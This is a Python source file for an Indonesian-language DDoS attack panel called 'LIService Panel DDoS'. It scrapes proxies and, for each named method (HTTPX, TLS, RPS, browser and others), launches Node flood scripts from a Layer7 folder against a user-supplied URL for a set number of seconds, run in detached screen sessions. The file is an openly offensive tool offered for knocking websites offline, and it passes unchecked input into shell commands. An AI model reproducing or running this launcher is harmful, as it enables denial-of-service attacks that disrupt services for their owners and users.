import os
import sys
import getpass
import time
import platform

def clear():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

def ddos():
    print("[!] Fitur DDOS belum tersedia sepenuhnya (dummy).")

def logo():
    clear()
    sys.stdout.write(f"\x1b]2;WELLCOME TO LISERVICE PANEL DDOS | DEVELOPMENT BY t.me/Lintar21 | MAIN MENU\x07")
    os.system('neofetch --ascii_distro Ubuntu || echo "[!] neofetch belum terinstall"')
    print("""
Version       : 1.0.0
Developer     : fadildev
Github        : github.com/fadildev
WhatsApp      : 6288212890423
Telegram      : t.me/fadildev01
Facebook      : fadildev
Support Team  : ESENTIAL DECODER 
Command < help >
""")

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
C = '\033[96m'
W = '\033[0m'

def menu():
    clear()
    sys.stdout.write(f"\x1b]2;WELLCOME TO LISERVICE PANEL DDOS | DEVELOPMENT BY t.me/Lintar21 | HELP MENU\x07")
    os.system('neofetch --ascii_distro Ubuntu || echo "[!] neofetch belum terinstall"')
    print(f"""
{C}                     █░░ █ █▀ █▀▀ █▀█ █░█ █ █▀▀ █▀▀
                     █▄▄ █ ▄█ ██▄ █▀▄ ▀▄▀ █ █▄▄ ██▄{W}    
             ╚╦═════════════════════════════════════════════╦╝
           ╔══╩═════════════════════════════════════════════╩═══╗
            {Y}LIService Panel DDoS | Development By t.me/LIService{W} 
           ╚══╦══════════════════════════════════════════════╦══╝
              ╚══════════════════════════════════════════════╝

{G}• PROXY  {W}| Premium proxies scraping | Tools
{G}• METHODS{W} | Available DDoS methods      | Menu
{G}• HELP   {W}| This is display             | Menu
{G}• STOP   {W}| Stop all attack on server  | Tools

{Y}! Jika ingin menggunakan perintah, gunakan huruf kecil semua (contoh: help, proxy, stop){W}
""")

def main():
    logo()
    while True:
        try:
            cnc = input("Panel•DDoS[LIService]-> ").strip()
            cmd = cnc.lower()

            if cmd == "methodss" or cmd == "methods":
                ddos()

            elif cmd in ["clear", "cls"]:
                logo()

            elif cmd == "help":
                menu()

            elif cmd == "stop":
                os.system("pkill screen")
                print("[✓] All attacks stopped.")

            elif cmd == "setup":
                os.system("python3 installer.py")
                print("[✓] Setup completed.")

            elif cmd == "proxy":
                os.system("cd Layer7 && python3 scrape.py")

            elif cmd.startswith("httpx") or cmd.startswith("strom") or cmd.startswith("browser") or cmd.startswith("https") or cmd.startswith("httpsv2") or cmd.startswith("reset") or cmd.startswith("raw") or cmd.startswith("vortex") or cmd.startswith("tls") or cmd.startswith("rps"):
                args = cnc.split()
                if len(args) < 3:
                    print(f"Usage: {args[0]} <url> <time>")
                    continue

                method = args[0].lower()
                host = args[1]
                attack_time = args[2]

                try:
                    attack_time_int = int(attack_time)
                except:
                    print("[!] Time harus berupa angka.")
                    continue

                clear()
                sys.stdout.write(f"\x1b]2;LISERVICE PANEL DDOS BY t.me/Lintar21 | Sent Attack\x07")
                sys.stdout.flush()

                if method == "httpx":
                    os.system(f'cd Layer7 && screen -dm node HTTPX {host} {attack_time} 8 8 proxy.txt')
                    os.system(f'cd Layer7 && screen -dm node HTTPZ {host} {attack_time} 8 8 proxy.txt')

                elif method == "strom":
                    os.system(f'cd Layer7 && screen -dm node STROM {host} {attack_time} 8 8 proxy.txt')

                elif method == "browser":
                    os.system(f'cd Layer7 && screen -dm node HTTPX {host} {attack_time} 8 8 proxy.txt')
                    os.system(f'cd Layer7 && screen -dm node HTTPZ {host} {attack_time} 8 8 proxy.txt')
                    os.system(f'cd Layer7 && screen -dm node LIService {host} {attack_time} 512 258 proxy.txt')
                    os.system(f'cd Layer7 && node browser.js {host} 8 proxy.txt 64 {attack_time} true --fin true --load true --headers true --blocked Indonesia --reconnect true --ipv6 true')

                elif method == "https":
                    os.system(f'cd Layer7 && screen -dm node HTPPSV2 GET {host} {attack_time} 8 8 proxy.txt')
                    os.system(f'cd Layer7 && screen -dm node HTTPS POST {host} {attack_time} 8 8 proxy.txt')

                elif method == "httpsv2":
                    os.system(f'cd Layer7 && screen -dm node HTPPSV2 POST {host} {attack_time} 8 8 proxy.txt --full')
                    os.system(f'cd Layer7 && screen -dm node HTTPS GET {host} {attack_time} 8 8 proxy.txt')

                elif method == "reset":
                    os.system(f'cd Layer7 && screen -dm node RESETV2 {host} {attack_time} 8 8 proxy.txt --full')
                    os.system(f'cd Layer7 && screen -dm node RESET {host} {attack_time} 8 8 proxy.txt')

                elif method == "raw":
                    os.system(f'cd Layer7 && screen -dm node RAW {host} {attack_time}')

                elif method == "vortex":
                    os.system(f'cd Layer7 && screen -dm node VORTEX {host} {attack_time} 8 8 proxy.txt')

                elif method == "tls":
                    os.system(f'cd Layer7 && screen -dm node TLS {host} {attack_time} 8 8 proxy.txt')
                    os.system(f'cd Layer7 && screen -dm node TLSV2 {host} {attack_time} 8 8 proxy.txt')

                elif method == "rps":
                    os.system(f'cd Layer7 && screen -dm node HTTPX {host} {attack_time} 8 8 proxy.txt')
                    os.system(f'cd Layer7 && screen -dm node HTTPZ {host} {attack_time} 8 8 proxy.txt')
                    os.system(f'cd Layer7 && screen -dm node LIService {host} {attack_time} 512 258 proxy.txt')
                    os.system(f'cd Layer7 && screen -dm node RAW {host} {attack_time}')
                    time.sleep(3)
                    clear()
                    os.system("screen -ls")
                    time.sleep(2)
                    clear()

                print(f"""{G}
[System] Attack Information
Target : {host}
Time   : {attack_time}s
Method : {method.upper()}
Type   : Type 'cls' to clear terminal{W}
""")
                time.sleep(attack_time_int)
                os.system('pkill screen')

            elif cmd == "credit":
                print("[System] Welcome to LIService Panel DDoS | Developed by t.me/LIService | Owner: t.me/Lintar21 | Use [help]")

            else:
                print(f"[!] Command '{cnc}' tidak ditemukan. Ketik 'help' untuk melihat daftar perintah.")

        except KeyboardInterrupt:
            print(f"\n{R}[!] Dihentikan oleh pengguna.{W}")
            break

if __name__ == "__main__":
    main()